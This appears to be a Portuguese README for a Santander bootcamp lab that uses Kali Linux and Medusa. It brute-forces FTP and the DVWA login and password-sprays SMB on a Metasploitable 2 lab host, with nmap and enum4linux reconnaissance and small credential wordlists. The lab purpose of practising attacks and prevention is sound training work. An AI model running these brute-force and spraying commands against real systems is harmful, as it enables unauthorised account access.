# Desafio-Bootcamp-Santander---Kali-Linux_Medusa
Projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

Criando um Brute Force Attack de senhas com Medusa e Kali Linux


Brute Force Attack


ping -c 3 192.168.56.101

nmap -sV -p 21,22,80,445,139 192.168.56.101

ftp 192.168.56.101


echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6


192.168.56.101/dvwa/login.php
 

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6


Password Spraying


enum4linux -a 192.168.56.101 | tee enum4_output.txt

less enum4_output.txt

echo -e "user\nmsfadmin\nservice" > smb_users.txt

echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

smbclient -L //192.168.56.101 -U msfadmin
